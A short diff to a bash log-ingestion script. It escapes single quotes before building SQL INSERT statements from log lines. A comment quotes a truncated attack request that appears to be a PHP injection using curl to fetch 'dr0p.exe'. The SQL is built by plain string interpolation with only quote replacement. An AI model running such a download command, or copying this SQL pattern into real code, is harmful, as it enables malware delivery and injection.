@@ -69,6 +69,10 @@ for LINE in "${LOG_LINES[@]}"; do
     if [[ "${request_uri}" =~ ^/hit/ ]]; then
       legit=1 # True
     fi
+    # Hack single quotes into hex.
+    # "...('curl%20-L...%2Fdr0p.exe');?>"
+    # "...(%27curl%20-L...%2Fdr0p.exe%27);?>"
+    LINE=$(echo "${LINE}" | sed "s/'/%27/g")
     _stmt="INSERT INTO ${TABLE_NAME} (epoch, legit, json) VALUES (${INSERT_DATE}, ${legit}, '${LINE}');\n"
     INSERT_STMT+=("${_stmt}")
     PROCESSED_REQUESTS=$(( PROCESSED_REQUESTS + 1 ))
